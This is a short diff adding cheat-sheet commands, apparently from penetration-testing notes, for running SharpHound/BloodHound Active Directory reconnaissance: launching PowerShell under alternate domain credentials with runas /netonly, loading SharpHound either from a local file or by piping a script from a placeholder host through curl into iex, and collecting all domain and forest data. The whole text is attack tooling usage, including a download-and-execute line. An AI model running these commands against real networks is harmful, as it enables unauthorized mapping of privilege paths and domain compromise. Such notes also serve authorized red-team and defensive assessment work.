@@ -1,0 +1,6 @@
+runas /netonly /user:{DOMAIN}\{USER} powershell.exe
+
+Import-Module SharpHound.ps1
+or
+curl http://{HOST}/SharpHound.ps1 | iex
+Invoke-Bloodhound -CollectionMethod All -Domain {DOMAIN} -SearchForest
